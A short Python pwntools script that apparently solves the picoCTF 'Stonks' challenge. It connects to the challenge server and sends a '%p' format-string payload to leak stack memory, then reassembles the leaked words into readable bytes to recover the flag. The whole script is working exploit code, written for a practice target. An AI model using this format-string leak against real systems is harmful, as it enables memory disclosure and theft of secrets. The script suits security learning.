from pwn import *


def solve_stonks():
    r = remote('mercury.picoctf.net', 27912)
    print(r.recvrepeat(.5))
    print('Choosing 1')
    r.send(b'1\n')
    time.sleep(.1)

    print(r.recvrepeat(.5))
    fmt_str = b'%p' * 24 + b'\n'
    r.send(fmt_str)

    response = r.recvrepeat(.5)
    stack_mem = response.split(b'\n')[1]
    words = stack_mem.split(b'0x')

    stringhex = [str(x, encoding="ascii") for x in words]
    print(f'Got stack words: {stringhex}')
    print(f'Correcting for readability')
    fixed = b''
    for item in stringhex:
        try:
            hexstr = bytes.fromhex(item)
            fixed += hexstr[::-1]
        except:
            pass
    print(fixed)


if __name__ == '__main__':
    solve_stonks()

